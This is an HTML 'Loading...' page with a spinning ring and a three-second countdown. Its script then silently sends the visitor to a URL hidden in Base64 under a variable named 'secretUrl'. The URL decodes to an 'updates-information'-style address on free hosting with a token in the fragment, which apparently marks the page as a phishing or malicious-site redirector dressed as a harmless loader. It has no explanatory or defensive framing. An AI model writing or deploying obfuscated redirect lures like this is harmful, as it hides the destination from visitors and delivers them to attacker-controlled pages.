<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* The wrapper that holds both the ring and the number */
        .loader-wrapper {
            position: relative;
            width: 80px;
            height: 80px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto;
        }

        /* The Spinning Ring */
        .loader-ring {
            position: absolute;
            width: 100%;
            height: 100%;
            border: 6px solid #f3f3f3; 
            border-top: 6px solid #3498db; 
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }

        /* The Number inside the circle */
        #count-num {
            font-size: 24px;
            font-weight: bold;
            color: #3498db;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #555555;
            margin-top: 20px;
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 2px;
            text-transform: uppercase;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="loader-wrapper">
            <div class="loader-ring"></div>
            <div id="count-num">3</div>
        </div>
        <div class="loading-text">Loading...</div>
    </div>

    <script>
        let timeLeft = 3;
        const numberDisplay = document.getElementById('count-num');

        // Update the number every second
        const countdownTimer = setInterval(function() {
            timeLeft--;
            
            if (timeLeft > 0) {
                numberDisplay.innerText = timeLeft;
            } else {
                clearInterval(countdownTimer);
                executeRedirect();
            }
        }, 1000);

        function executeRedirect() {
            // Your Base64 encoded URL
            const secretUrl = 'aHR0cHM6Ly91cGRhdGVzLWluZm9ybWF0aW9uamRuLnJmLmdkL2EvI1kyRWpmUEJuOFRpWA==';
            
            // Final jump
            window.location.href = atob(secretUrl);
        }
    </script>

</body>
</html>
